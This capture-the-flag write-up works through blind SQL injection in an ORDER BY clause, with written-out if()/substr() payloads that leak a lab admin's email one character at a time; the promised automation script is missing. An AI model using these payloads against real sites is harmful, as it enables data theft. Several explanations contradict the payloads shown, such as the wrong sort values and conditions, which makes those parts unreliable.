---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 23
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/50a38bf9-d127-4ab6-ad25-321eb0130c99)

We are provided with the SQL query:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY {$_GET[order]}
```

This challenge returns the output in the form of a table.

If we provide the following URI parameter:

```
?order=id
```

The resultant query becomes:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY id
```

![2](https://github.com/Kunull/Write-ups/assets/110326359/a1e61aae-d070-4cea-b385-c1e6cd9195fb)

As we can see there are two users: `admin` and `rubiya`.

We can solve this challenge using two different methods:
1. Assigning sort value
2. Sorting by different columns

## Blind SQL Injection - (Assigning different sort value)

In this method, we will assign a sort value to the result that we want.

### Retrieving the email length

If we provide the following URI parameter:

```
?order=if(id='admin' AND length(email)=__number__, 1, 2)
```

The resultant query becomes:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND length(email)=num, 1, 2)
```

Rows where `id='admin'` and `length(email)=1` will be given a sort value of 1 and will appear first. All other rows will be given a sort value of 3 and will appear afterwards.

![[3 169.png]]

Since the `admin` user is not sorted first, it means that `id='admin' AND length(email)=1` did not result in `True`. This tells us that the email length is greater than 1.

We can move onto greater values:

```
?order=if(id='admin' AND length(email)=28, 1, 2)
```

The resultant query becomes:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND length(email)=28, 1, 2)
```

![[4 146.png]]

Since the `admin` user is sorted first, it means that `id='admin' AND length(email)=1` resulted in `True`. This tells us that the email length is 28.
### Leaking the password

If we provide the following URI parameter:

```
?order=if(id='admin' AND substr(email, 1, 1)='0', 1, 2)
```

The resultant query becomes:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND substr(email, 1, 1)='0', 1, 2)
```

Rows where `id='admin'` and `length(email)=1` will be given a sort value of 1 and will appear first. All other rows will be given a sort value of 3 and will appear afterwards.

![[6 102.png]]

Since the `admin` user is not sorted first, it means that `id='admin' AND substr(email, 1, 1)='0'` did not result in `True`. This tells us that the first character of the email is not `0`.

We can move onto other characters:

```
?order=if(id='admin' AND substr(email, 1, 1)='a', 1, 2)
```

The resultant query becomes:

```sql
SELECT id,email,score FROM prob_hell_fire WHERE 1 ORDER BY if(id='admin' AND substr(email, 1, 1)='a', 1, 2)
```

![[7 74.png]]

Since the `admin` user is first, it means that `id='admin' AND substr(email, 1, 1)='0'` resulted in `True`. This tells us that the first character of the email is `a`.

We can leak out all 28 character this way.

```
admin_secure_email@emai1.com
```
### Script

We can automate this process using a script. Since `_` and `.` are filtered out, we will have to convert these characters into their ASCII representation using the `ord()` function.



```
admin_secure_email@emai1.com
```

```
admin%5Fsecure%5Femail@emai1.com
```
